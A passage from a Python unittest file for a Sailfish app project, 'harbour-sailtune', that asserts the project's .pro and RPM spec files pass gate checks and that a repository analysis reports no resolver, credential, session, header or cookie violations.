        with open(os.path.join(self.ROOT, "sailtune.pro")) as h:
            self.assertEqual(inv.gate_pro_text(h.read(), prof["pro_gates"], prof["pro_guard_tokens"]), [])
        with open(os.path.join(self.ROOT, "rpm", "harbour-sailtune.spec")) as h:
            self.assertEqual(inv.gate_spec_text(h.read(), prof["spec_gates"]), [])

    def test_no_resolver_or_sink_violation_in_the_repository(self):
        errors, _, _ = inv.analyse(self.ROOT, self.allow())
        self.assertEqual([x for x in errors if any(k in x for k in ("resolver", "persistence", "credential", "session", "header", "cookie"))], [])


if __name__ == "__main__":
    unittest.main()
